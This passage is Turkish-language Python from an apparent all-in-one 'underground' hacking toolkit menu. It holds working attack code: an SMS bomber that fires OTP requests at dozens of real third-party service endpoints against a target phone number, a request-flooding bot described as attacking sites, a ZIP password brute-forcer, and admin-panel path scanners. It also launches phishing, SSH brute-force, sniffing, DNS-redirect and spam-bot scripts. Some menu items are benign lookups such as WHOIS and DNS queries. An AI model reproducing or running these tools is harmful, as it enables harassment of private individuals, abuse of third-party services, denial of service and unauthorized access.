            print("\n Tek kullanımlık panelsiz mail. İlk deneyişte kabul etmezse bir daha üretebilirsiniz")
            print("||||||||||||||||||||||||||||||||||")
            print("\n"+kelimeler+mail+"\n")
            print("||||||||||||||||||||||||||||||||||")
    
        elif(yeraltisecim=="9"):
            url = input("Url giriniz > ")
            print("")
            print("\033[92mAlttaki linklerden biri panel olabilir")
            print("")
            print(url+"/admin.php") 
            print("")
            print(url+"/admin.html")
            print("")
            print(url+"/administrator")
            print("")
            print(url+"/admin")
            print("")
            print(url+"/adminpanel")
            print("")
            print(url+"/cpanel")
            print("")
            print(url+"/login")
            print("")
            print(url+"/wp-login.php")
            print("")
            print(url+"/admins")
            print("")
            print(url+"/logins")
            print("")
            print(url+"/admin.asp")
            print("")
            print(url+"/adm")
            print("")
            print(url+"/admin/account.html")
            print("")
            print(url+"/admin/login.html")
            print("")
            print(url+"/admin/login.htm")
            print("")
            print(url+"/admin/controlpanel.html")
            print("")
            print(url+"/admin.htm")
            print("")
            print(url+"/admin/controlpanel.htm")
            print("")
            print(url+"admin/adminLogin.html")
            print("")
            print(url+"admin/adminLogin.htm")
            print("")
    
        elif(yeraltisecim=="10"):
            os.system("pip install pyautogui")
            os.system("python3 spambot.py")
    
        elif(yeraltisecim=="11"):
            import urllib.parse
            import urllib.request
            import os
    
    
            ip = input("Ip giriniz > ")
            son = ("http://ip-api.com/json/"+ip)
            son2 = ("https://api.iplocation.net/?ip="+ip)
            print("\n SONUÇ: \n")
            urllib.request.urlretrieve(son, "sonuc.json")
            import json
            yazilmis = open("sonuc.json")
            jsonveri = yazilmis.read()
            veriler = json.loads(jsonveri)
            print("Durum: "+veriler["status"])
            print("Ülke: "+veriler["country"])
            print("Ülke Kodu: "+veriler["countryCode"])
            print("Bölge Numarası: "+veriler["region"])
            print("Şehir: "+veriler["city"])
            print("Posta Kodu: "+veriler["zip"])
            print("Saat Dilimi: "+veriler["timezone"])
            print("İnternet Sağlayıcısı: "+veriler["isp"])
            print("Lat: "+str(veriler["lat"]))
            print("Lon: "+str(veriler["lon"]))
            print("Org: "+veriler["org"])
            print("As: "+veriler["as"])
            print("Hedef: "+veriler["query"])
            print("\n ------------------Json verileri------------------ \n \n"+jsonveri)
            os.system("rm -rf sonuc.json")
    
        elif(yeraltisecim=="12"):
            import urllib.request
            import threading
            import time
            header_kodlarım = {
                'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikittool X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikittool/48.0.2564.116 ultrabot/537.36'}
            print("Bu bot arkaplanda belirtilen siteye sizin cihazınızdan art arda onlarca giriş yaparak siteye saldırır. Görüntüleme hilesi oluşturmak için de kullanılabilir. Aracın hiçbir programı için sorumluluk kabul edilmez.")
            site_adresi = input("Site adresi giriniz > ")
            site_adresi2 = site_adresi
            istek = urllib.request.Request(site_adresi, headers= header_kodlarım)
            istek2 = urllib.request.Request(site_adresi2, headers= header_kodlarım)
            istek3 = urllib.request.Request(site_adresi, headers= header_kodlarım)
            istek4 = urllib.request.Request(site_adresi, headers= header_kodlarım)
            istek5 = urllib.request.Request(site_adresi, headers= header_kodlarım)
            dos = urllib.request.urlopen(istek)
            for i in range(1,5):
                html = urllib.request.urlopen(istek)
                print("başarılı, devam ediyorum.")
                time.sleep(5)
                for i in range(1,4):
                    urllib.request.urlopen(istek2)
                    urllib.request.urlopen(istek3)
                    print("başarılı, devam ediyorum.")
                    time.sleep(10)
                    for i in range(1,3):
                        t1 = threading.Thread(target=dos)
                        t1.start()
    
    
    
        elif(yeraltisecim=="13"):
            os.system("pip install pynput")
            os.system("python3 ototikla.py")
    
        elif(yeraltisecim=="14"):
            import requests
            import urllib.request
            import time
            
            from json import dumps
            print("\nTam çalışmayabilir. Sorumluluk kabul edilmez.")
            num = input("Sms bomb için numara gir (+905555555555 şeklinde) ")
            phone = num
            cellphone = num[3:]
            headerler = {
                'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) SxTOOL/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'}
    
        
            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=tr&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))
            except:
                print("Başarısız")
    
    
            try:
                print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': num}))
            except:
                print("Başarısız")
    
            try:
                    print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': num}))
            except:
                print("Başarısız")
    
    
            try:
                print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":num}))
            except:
                print("Başarısız")
    
    
            try:
                    print(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': num}))
            except:
                print("Başarısız")
    
            try:
                    print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers=headerler))
            except:
                print("Başarısız")
    
            try:
                requests.post(f"https://findclone.ru/register?phone=+{phone}")
            except:
                print("Başarısız")
    
            try:
                requests.post(f"https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={phone}")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://api.eldorado.ua/v1/sign?login={phone}&step=phone-check&fb_id=null&fb_token=null&lang=ru")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}")
                print("Başarılı")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
                print("Başarılı")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://www.oyorooms.com/api/pwa/generateotp?phone=+{phone}&country_code=%2B7&nod=4&locale=en")
                print("Başarılı")
            except:
                print("Başarısız")
            try:
                requests.post(f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}")
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://www.rabota.ru/remind', data={'credential': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://3040.com.ua/taxi-ordering', data={'callback-phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://alfalife.cc/auth.php', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://pampik.com/callback', data={'phoneCallback': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://city24.ua/personalaccount/account/registration', data={'PhoneNumber': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://my.dianet.com.ua/send_sms/', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://vladimir.edostav.ru/site/CheckAuthLogin', data={'phone_or_email': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://www.finam.ru/api/smslocker/sendcode', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://friendsclub.ru/assets/components/pl/connector.php', data={'phone': num, 'casePar':'authSendsms'})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://helsi.me/api/healthy/accounts/login', data={'phone': num,'platform':'PISWeb'})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://api.imgur.com/account/v1/phones/verify', data={'phone_number': num, 'region_code':'TR'})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://izi.ua/api/auth/sms-login', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://kaspi.kz/util/send-app-link', data={'adress': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://koronapay.com/transfers/online/api/users/otps', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://loany.com.ua/funct/ajax/registration/code', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://pizzasinizza.ru/api/phoneCode.php', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
            try:
                requests.post('https://sayoris.ru/?route=parse/whats', data={'phone': num})
                print("Başarılı")
            except:
                print("Başarısız")
    
    
    
        elif(yeraltisecim=="15"):
            print("\033[92m")
            os.system("cls" if os.name == "nt" else "clear")
            print('''
         .--------.
        / .------. 
       | |        
      _| |________| |_
    .' |_|        |_| '. Wordlistiniz var mı? 
    '._____ ____ _____.'
    |     .'____'.     | (Yok seçeneği işaretlenirse program sizin için oluşturacak)
    '.__.'.'    '.'.__.'
    '.__  |Sxtool|  __.| 1-) Wordlistim var
    |   '.'.____.'.'   | 
    '.____'.____.'____.' 2-) Wordlistim yok
    '.________________.'
    
    
            ''')
            aaaas = input("Seç > ")
    
            if(aaaas=="2"):
                import random 
                import pyzipper
                import os
                os.system("pip install pyzipper")
            
                chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")
    
                password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
                password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
                for x in range(0,password_sayi):
                    password = ""
                    for x in range(0,password_uzunluk):
                        password_sayi = random.choice(chars)
                        password    = password + password_sayi
                    #print(password)
                    passworda = (password+"\n")
                    dosya = open("wlist.txt","a")
                    dosya.write(passworda)
    
    
                wordlist = ("wlist.txt")
    
                file = input("Zip dosya yolunu belirtiniz > ")    
                icdosya = input("Zip dosyası içinden herhangi bi dosya adı+uzantı giriniz > ")
        
                fileobject = pyzipper.AESZipFile(file)
    
                with open(wordlist,"rb") as wordlist:
                    for word in wordlist:
                        try:
                            fileobject.pwd = word.strip()
                            fileobject.read(icdosya)
                        except:
                            print("\033[93mŞifre denendi = ",word.decode().strip())
                            continue
                        else:
                            print("\033[92mŞifre bulundu! İşte şifre = ",word.decode().strip())
                            os.system("rm -rf wlist.txt")
                            exit(0)
                    
                os.system("rm -rf wlist.txt")
                print("\033[91mŞifre Bulunamadı")
    
            elif(aaaas=="1"):
                import pyzipper
                import os
                os.system("pip install pyzipper")
                wordlist = input("Wordlist Yolunu Belirtiniz > ")
    
                file = input("Zip dosya yolunu belirtiniz > ")    
                icdosya = input("Zip dosyası içinden herhangi bi dosya adı+uzantı giriniz > ")
    
                fileobject = pyzipper.AESZipFile(file)
    
                with open(wordlist,"rb") as wordlist:
                    for word in wordlist:
                        try:
                            fileobject.pwd = word.strip()
                            fileobject.read(icdosya)
                        except:
                            print("\033[93mŞifre denendi = ",word.decode().strip())
                            continue
                        else:
                            print("\033[92mŞifre bulundu! İşte şifre = ",word.decode().strip())
                            exit(0)
                print("\033[91mŞifre Bulunamadı")
    
    
        elif(yeraltisecim=="16"):
            import random 
            import os
            chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")    
            password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
            password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
            for x in range(0,password_sayi):
                password = ""
                for x in range(0,password_uzunluk):
                    password_sayi = random.choice(chars)
                    password    = password + password_sayi
                passworda = (password+"\n")
                dosya = open("sxwlist.txt","a")
                dosya.write(passworda)
    
        elif(yeraltisecim=="17"):
            os.system("python3 oltalama/openserver.py")
    
    
        elif(yeraltisecim=="18"):
            os.system("cls" if os.name == "nt" else "clear")
            os.system("python3 instabot.py")
    
    
        elif(yeraltisecim=="19"):
            import requests
            from bs4 import BeautifulSoup
            header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikit X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikit/48.0.2564.116 Naber/537.36'}
            print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
            hedefsite = input("Hedef Url Giriniz: ")
            hedefl = requests.get(hedefsite,headers=header_kod)
            hedefg = hedefl.content
            guzelcorba = BeautifulSoup(hedefg,"html.parser")
            for i in guzelcorba.find_all("a"):
                    print(i)
                    print("\n ################################################################ \n")
    
        elif(yeraltisecim=="20"):
            import requests
            from bs4 import BeautifulSoup
            header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikit X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikit/48.0.2564.116 Naber/537.36'}
            print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
            hedefsite = input("Hedef Url Giriniz: ")
            hedefl = requests.get(hedefsite,headers=header_kod)
            hedefg = hedefl.content
            guzelcorba = BeautifulSoup(hedefg,"html.parser")
            for i in guzelcorba.find_all("html" and "p"):
                    print(i)
                    print("\n ################################################################ \n")
    
    
    #kodları beğendin mi :)
    
        elif(yeraltisecim=="21"):
            import requests
            from bs4 import BeautifulSoup
            header_kod = { 'User-Agent' : 'Mozilla/5.0 (Machintosh; omnikit X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecho) omnikit/48.0.2564.116 Naber/537.36'}
            print("Örnek site: https://google.com  http/https eklemeyi unutmayın")
            hedefsite = input("Hedef Url Giriniz: ")
            hedefl = requests.get(hedefsite,headers=header_kod)
            hedefg = hedefl.content
            guzelcorba = BeautifulSoup(hedefg,"html.parser")
            for i in guzelcorba.find_all("img"):
                    print(i)
                    print("\n ################################################################ \n")
    
    
    
        elif(yeraltisecim=="22"):
            ilkd = input("İlk dosyanın adresini giriniz: ")
            sond = input("Son dosyanın adresini giriniz: ")
            ilkv = open(ilkd)
            sonv = open(sond)
            ilk = str(ilkv.read())
            son = str(sonv.read())
            if(ilk==son):
                print("\033[92mEşleşme Başarılı")
            else:
                print("\033[91mEşleşme Başarısız")
                
        elif(yeraltisecim=="23"):
            import os
            print(''' 
            \33[92m
              ad8888888888ba
             dP'         `"8b, 
             8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
             8  8'd`8           "88baadP""""YbaaadP"""YbdP""Yb
             8  8 t 8              """        """      ""    8b
             8  8,0,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
             8  `"""'       ,d8""     0-Ana Menü
             Yb,         ,ad8"        1-Şifrele
              "Y8888888888P"      2-Şifreyi Çöz
            ''')
            secim = input("Seçiminizi yapınız > ")
            if(secim=="0"):
                os.system("python3 omnikittoolsv"+surum+".py")
                
            if(secim=="1"):
                dosyayolu = input("Dosya Yolunu Belirtiniz > ")
                yazilar = open(dosyayolu)
                veri = yazilar.read()
                veri19 = veri.replace("print","5Fg%FaD8++")
        
                veri1 = veri19.replace("import os","^^#294^ert%+'1")
                veri2 = veri1.replace("import socket","+'^'!trweS1a54")
                veri3 = veri2.replace("random.choice","m+^!lkdw%A")
                veri4 = veri3.replace("import random","l(Ed+S'wa^'")
                veri5 = veri4.replace("elif(","%+^i+se/e}0y!ou+^!")
                veri6 = veri5.replace("def","%&dagbfaFFFsaw")
                veri7 = veri6.replace("class","GAGF53DA221")
                veri8 = veri7.replace("else","242BGAD32FEF53")
                veri9 = veri8.replace("import urllib.request","7E6Q-dw!aY^o'")
                veri10 = veri9.replace("input(","1F'dA4^12&")
                veri11 = veri10.replace("float","92324232213")
                veri12 = veri11.replace("os.system","&&76fr}R5")
                veri13 = veri12.replace("import time","\gwalj//2CxZ")
                veri14 = veri13.replace("import requests","*1)92DfH/c")
                veri15 = veri14.replace("except","}23!ERtdaBFV")
                veri16 = veri15.replace("time.sleep","{da^2sda'^da^")
                veri17 = veri16.replace("while True:","-2'!3gf+51")
                veri18 = veri17.replace("for i in range","yU32kL:q")
                veri20 = veri18.replace("<html>","DWM32D3S&%DW")
                veri21 = veri20.replace("</html>","ODW+'2GH")
                veri22 = veri21.replace("<meta","KFE21{ad4")
                veri23 = veri22.replace("<title>","dwm36Uwda")
                veri24 = veri23.replace("</title>","D_DW]D^17W")
                veri25 = veri24.replace("<head>","KD{W/A+Mdw")
                veri26 = veri25.replace("<body>","5232fagw+da'^")
                veri27 = veri26.replace("</body>","LDW21f42nw")
                veri28 = veri27.replace("<p>","GAF32PDW+DLW")
                veri29 = veri28.replace("</p>","K90E2FADW")
                veri30 = veri29.replace("<?php","MDW^AD6TY")
                veri31 = veri30.replace("?>","JDK3dw^1wd")
                veri32 = veri31.replace("<script>","GFA^4dwA")
                veri33 = veri32.replace("</script>","42B24DJ21F")
                veri34 = veri33.replace("<table>","ld-a'L+DA")
                veri35 = veri34.replace("</table>","Kdwa%32VV")
                veri36 = veri35.replace("<div","kLDA^rBaE")
                veri37 = veri36.replace("</div","4$da32^fa")
                veri38 = veri37.replace("<br>","Lda^!ws'")
                veri39 = veri38.replace("<a href","lfDAw22ES+'1")
                veri40 = veri39.replace("</head>","2DfFAFa+3D")
    
                yazilarson = open("encsuccess.txt","w+")
                yazilarson.write(veri40)
                print("Başarılı, dosya bulunduğunuz dizine oluşturuldu")
    
            if(secim=="2"):
                dosyayolu = input("Dosya Yolunu Belirtiniz > ")
                yazilar = open(dosyayolu)
                veri = yazilar.read()
                veri19 = veri.replace("5Fg%FaD8++","print")
        
                veri1 = veri19.replace("^^#294^ert%+'1","import os")
                veri2 = veri1.replace("+'^'!trweS1a54","import socket")
                veri3 = veri2.replace("m+^!lkdw%A","random.choice")
                veri4 = veri3.replace("l(Ed+S'wa^'","import random")
                veri5 = veri4.replace("%+^i+se/e}0y!ou+^!","elif(")
                veri6 = veri5.replace("%&dagbfaFFFsaw","def")
                veri7 = veri6.replace("GAGF53DA221","class")
                veri8 = veri7.replace("242BGAD32FEF53","else")
                veri9 = veri8.replace("7E6Q-dw!aY^o'","import urllib.request")
                veri10 = veri9.replace("1F'dA4^12&","input(")
                veri11 = veri10.replace("92324232213","float")
                veri12 = veri11.replace("&&76fr}R5","os.system")
                veri13 = veri12.replace("\gwalj//2CxZ","import time")
                veri14 = veri13.replace("*1)92DfH/c","import requests")
                veri15 = veri14.replace("}23!ERtdaBFV","except")
                veri16 = veri15.replace("{da^2sda'^da^","time.sleep")
                veri17 = veri16.replace("-2'!3gf+51","while True:")
                veri18 = veri17.replace("yU32kL:q","for i in range")
                veri20 = veri18.replace("DWM32D3S&%DW","<html>")
                veri21 = veri20.replace("ODW+'2GH","</html>")
                veri22 = veri21.replace("KFE21{ad4","<meta")
                veri23 = veri22.replace("dwm36Uwda","<title>")
                veri24 = veri23.replace("D_DW]D^17W","</title>")
                veri25 = veri24.replace("KD{W/A+Mdw","<head>")
                veri26 = veri25.replace("5232fagw+da'^","<body>")
                veri27 = veri26.replace("LDW21f42nw","</body>")
                veri28 = veri27.replace("GAF32PDW+DLW","<p>")
                veri29 = veri28.replace("K90E2FADW","</p>")
                veri30 = veri29.replace("MDW^AD6TY","<?php")
                veri31 = veri30.replace("JDK3dw^1wd","?>")
                veri32 = veri31.replace("GFA^4dwA","<script>")
                veri33 = veri32.replace("42B24DJ21F","</script>")
                veri34 = veri33.replace("ld-a'L+DA","<table>")
                veri35 = veri34.replace("Kdwa%32VV","</table>")
                veri36 = veri35.replace("kLDA^rBaE","<div")
                veri37 = veri36.replace("4$da32^fa","</div>")
                veri38 = veri37.replace("Lda^!ws'","<br>")
                veri39 = veri38.replace("lfDAw22ES+'1","<a href")
                veri40 = veri39.replace("2DfFAFa+3D","</head>")
    
                yazilarson = open("decsuccess.txt","w+")
                yazilarson.write(veri40)
                print("Başarılı, dosya bulunduğunuz dizine oluşturuldu")
    
    
        elif(yeraltisecim == "24"):
            print("""
    1-) Dosyada kelimeyi içeren tüm satırları listele
    2-) Dosyada kelimeyi içeren tüm satırları ve bu satırların satır numaralarını listele
    3-) Büyük/küçük harf duyarsız olarak dosyada kelimeyi içeren tüm satırları listele""")
            dosyaislemleri = input("Seçiminizi giriniz: ")
            kelime = input("Hedef kelimeyi giriniz: ")
            dosya = input("Arama yapılacak dosya yolu giriniz: ")
            if dosyaislemleri == "1":
                try:
                    with open(dosya, 'r', encoding='utf-8') as f:
                        for satir in f:
                            if kelime in satir:
                                print(satir, end='')
                except FileNotFoundError:
                    print(f"Dosya bulunamadı: {dosya}")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
    
            elif dosyaislemleri == "2":
                try:
                    with open(dosya, 'r', encoding='utf-8') as f:
                        for numara, satir in enumerate(f, start=1):
                            if kelime in satir:
                                print(f"{numara}: {satir}", end='')
                except FileNotFoundError:
                    print(f"Dosya bulunamadı: {dosya}")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
            elif dosyaislemleri == "3":
                try:
                    with open(dosya, 'r', encoding='utf-8') as f:
                        for satir in f:
                            if kelime.lower() in satir.lower():
                                print(satir, end='')
                except FileNotFoundError:
                    print(f"Dosya bulunamadı: {dosya}")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
            else:
                print("Geçersiz seçim")
    
    
        elif(yeraltisecim=="25"):
            import requests
            import time
            def dosya_var_mi(url):
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(f"{url} mevcut!")
                        return True
                    else:
                        print(f"{url} bulunamadı (Status Code: {response.status_code})")
                        return False
                except requests.exceptions.RequestException as e:
                    print(f"Bir hata oluştu: {e}")
                    return False
    
            def listeden_url_kontrol(list_dosyasi, ana_url, bekleme_suresi):
                try:
                    with open(list_dosyasi, 'r') as file:
                        dosyalar = file.readlines()
            
                    for dosya in dosyalar:
                        dosya = dosya.strip()  
                        tam_url = f"{ana_url}/{dosya}"
                        dosya_var_mi(tam_url)
                        time.sleep(bekleme_suresi) 
    
                except FileNotFoundError:
                    print(f"{list_dosyasi} dosyası bulunamadı.")
                except Exception as e:
                    print(f"Bir hata oluştu: {e}")
    
            ana_url = input("Kontrol etmek istediğiniz URL'yi (https://site.com gibi) giriniz: ")
            print("Not: Bekleme süresini arttırmak daha düzgün tarama yapmanızı sağlar. Bunun yanında işlem süresi uzar. İdeal işlem süresi 5-7'dir")
            bekleme_suresi = int(input("Her kontrol arasında bekleme süresi (saniye cinsinden) girin: "))
            print("İsterseniz hazır wordlisti de kullanabilirsiniz. Bunun için wordlist giriş kısmına admin_list.txt yazınız.")
            print("Buradaki hazır wordlisti https://github.com/alienwhatever/Admin-Scanner/blob/master/list.txt adresinden aldım.")
            list_dosyasi = input("Wordlist dosyası giriniz: ")
            listeden_url_kontrol(list_dosyasi, ana_url, bekleme_suresi)
    
    
    
        elif(yeraltisecim=="26"):
            print("""Hangi servis üzerinde işlem yapmak isterseniz o servise bağlı numarayı giriniz.
    Seçenekler:
    1 - Tinyurl
    2 - isgd""")
            linksecim = int(input("Seçiminiz (1-2): "))
            import requests
            if linksecim==2:
                uzun_url = input("Kısaltılacak URL adresini giriniz: ")
                response = requests.get(f"http://is.gd/create.php?format=simple&url={uzun_url}")
                print("Kısaltılmış URL adresi:")
                print(response.text)
    
            elif linksecim==1:
                api_url = 'http://tinyurl.com/api-create.php?url='
                uzun_url = input("Kısaltılacak url adresini giriniz:")
                response = requests.get(api_url+uzun_url)
                print("Kısaltılmış url adresi:")
                print(response.text)
    
            else:
                print("Yalnızca 1 ve 2 seçenekleri mevcuttur.")
    
    
        elif(yeraltisecim=="27"):
            import requests
            print("Domain girerken https veya da www yazmayın. Yalnızca google.com şeklinde yazınız.")
            domain = input("WHOIS bilgilerini almak istediğiniz domaini giriniz: ")
            response = requests.get(f"https://rdap.org/domain/{domain}")
            whois_info = response.json()
            print(f"{domain} için WHOIS bilgileri:")
            print(whois_info)
    
    
        elif(yeraltisecim=="28"):
            import requests
            print("Domain girerken https veya da www yazmayın. Yalnızca google.com şeklinde yazınız.")
            domain = input("SSL analizini yapmak istediğiniz domaini giriniz: ")
            response = requests.get(f"https://api.ssllabs.com/api/v3/analyze?host={domain}")
            ssl_info = response.json()
            print(f"{domain} için SSL/TLS bilgileri:")
            print(ssl_info)
    
        elif(yeraltisecim=="29"):
            import requests
            response = requests.get("https://randomuser.me/api/")
            user = response.json()
            print("Rastgele kullanıcı:")
            print(f"İsim: {user['results'][0]['name']['first']} {user['results'][0]['name']['last']}")
            print(f"E-posta: {user['results'][0]['email']}")
            print(f"Ülke: {user['results'][0]['location']['country']}")
    
        elif(yeraltisecim=="30"):
            import requests
            print("Bu program sizin için sahte gönderi başlığı oluşturur. Farklı dillerde sonuç alabilirsiniz.")
            response = requests.get("https://jsonplaceholder.typicode.com/posts")
            posts = response.json()
            gonderi_sayi = int(input("Kaç gönderi görmek istiyorsunuz:"))
            print("İlk",gonderi_sayi,"gönderi:")
            for post in posts[:gonderi_sayi]:
                print(f"ID: {post['id']}, Başlık: {post['title']}")
    
        elif(yeraltisecim=="31"):
            import requests
            domain = input("DNS bilgilerini almak istediğiniz domaini giriniz: ")
            response = requests.get(f"https://dns.google/resolve?name={domain}")
            dns_info = response.json()
            print(f"{domain} için DNS bilgileri:")
            for answer in dns_info.get('Answer', []):
                print(answer)
    
        elif(yeraltisecim=="32"):
            import requests
            isbn = input("ISBN numarasını giriniz: ")
            response = requests.get(f"https://openlibrary.org/api/books?bibkeys=ISBN:{isbn}&format=json&jscmd=data")
            kitap = response.json()
            print(f"Kitap Bilgisi: {kitap}")
    
        elif(yeraltisecim=="33"):
            import requests
            print("Bu sistem 2 yönlü api testi yapmaktadır. 2 seçeneği de deneyebilirsiniz. Bir seçenek hata verirse diğer seçeneğe geçiniz.")
            mailltestsecim = input("1 veya 2 yazınız. Hata alırsanız diğer seçeneği deneyiniz:")
            email = input("Doğrulamak istediğiniz e-posta adresini giriniz: ")
            if mailltestsecim=="1":
                response = requests.get(f"https://api.eva.pingutil.com/email?email={email}")
                email_info = response.json()
                print(f"Geçerli mi?: {email_info['data']['deliverable']}")
            elif mailltestsecim=="2":
                print("Mail dinleniyor...")
                os.system(f"""curl "https://api.eva.pingutil.com/email?email={email}" | json_pp""")
            else:
                print("Yanlış tuşladınız")
    
        elif(yeraltisecim=="34"):
            import requests
            ip = input("Analiz etmek istediğiniz IP adresini girin: ")
            response = requests.get(f"https://api.greynoise.io/v3/community/{ip}")
            ip_data = response.json()
            if ip_data.get("noise") == "true":
                print(f"{ip} bir zararlı faaliyete sahip.")
            else:
                print(f"{ip} güvenli görünüyor.")
            
    
        elif(yeraltisecim=="35"):
            os.system("python3 kits/sshbrute.py")
    
        elif(yeraltisecim=="36"):
            os.system("python3 kits/port-scanner-ip.py")
    
        elif(yeraltisecim=="37"):
            os.system("python3 kits/anormal-dns-tespit.py")
    
        elif(yeraltisecim=="38"):
            os.system("python3 kits/dns-yonlendirici.py")
    
        elif(yeraltisecim=="39"):
            os.system("python3 kits/sniff.py")
    
        elif(yeraltisecim=="40"):
            os.system("python3 kits/sniff2.py")
    
    
    
        elif(yeraltisecim=="41"):
            os.system("python3 omnikittoolsv"+surum+".py")
        else:
            print("Hatalı seçim, doğru seçeneği girdiğinizden emin olunuz")
    
    
        ana_menuye_don()
    # Tool 15: Underground Menu (Full Implementation)
    elif(omnikitsecim=="15"):
        r1 = "\033[91m"  # Kırmızı
        r2 = "\033[92m"  # Yeşil
        r3 = "\033[93m"  # Sarı
        r4 = "\033[94m"  # Mavi
        r5 = "\033[95m"  # Mor
        r6 = "\033[96m"  # Camgöbeği
        r7 = "\033[97m"  # Beyaz
        r9 = "\033[31m"  # Koyu kırmızı
        r10 = "\033[32m" # Koyu yeşil
        r11 = "\033[33m" # Koyu sarı
        r12 = "\033[34m" # Koyu mavi
        r13 = "\033[35m" # Koyu mor
        r14 = "\033[36m" # Koyu camgöbeği
        r15 = "\033[37m" # Koyu beyaz
    
        rengo2 = [r1, r2, r3, r4, r5, r6, r7, r9, r10, r11, r12, r13, r14, r15]
    
        renkki2 = random.choice(rengo2)
        os.system("apt-get install figlet")
        os.system("cls" if os.name == "nt" else "clear")
        print(renkki2)
        print('''

╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██████╗ ███╗   ███╗███╗   ██╗██╗██╗  ██╗██╗████████╗ ║
║  ██╔═══██╗████╗ ████║████╗  ██║██║██║ ██╔╝██║╚══██╔══╝ ║
║  ██║   ██║██╔████╔██║██╔██╗ ██║██║█████╔╝ ██║   ██║    ║
║  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║██╔═██╗ ██║   ██║    ║
║  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║██║  ██╗██║   ██║    ║
║   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝   ╚═╝    ║
║                                                          ║
║              UNDERGROUND TOOLS MENU                      ║
║              YERALTINA HOŞ GELDİNİZ                      ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝

    YERALTINA HOŞ GELDİNİZ 
    
    
    1-) Etkinleştirme Kodu Oluşturucuları
    
    2-) Şifre Oluşturucu
    
    3-) Şifre Oluşturucu v2
    
    4-) Kullanıcı Adı ile Hesap Bulma (Statik)
    
    5-) T¢ Son 2 Hane Bulma 
    
    6-) An0nimSMS (Hata alanlar vpn ile denesin)
    
    7-) Telefon Numarasından Şehir Bulma (TR deaktif)
    
    8-) Panelsiz Mail (Statik)
    
    9-) Admin Panel Tara (Statik)
    
    10-) Spambot
    
    11-) Ip Adresinden Bilgi Topla
    
    12-) UltraBot
    
    13-) Oto tıklayıcı
    
    14-) Sms Bomb
    
    15-) Zip Şifre Kırıcı
    
    16-) Wordlist Oluşturucu
    
    17-) Oltalama Araçları
    
    18-) Instagram Bot
    
    19-) Sitedeki Linkleri Çekme
    
    20-) Sitedeki Yazıları Çekme
    
    21-) Sitedeki Resim Yollarını Çekme
    
    22-) Dosyalar Arası Veri Karşılaştırma
    
    23-) StnCrypt
    
    24-) Dosya İçerisinde Arama İşlemleri (Linux)
    
    25-) Admin Panel Bulucu (Dinamik)
    
    26-) Link Kısaltma Servisleri
    
    27-) Whois Sorgulama
    
    28-) SSL Analizi
    
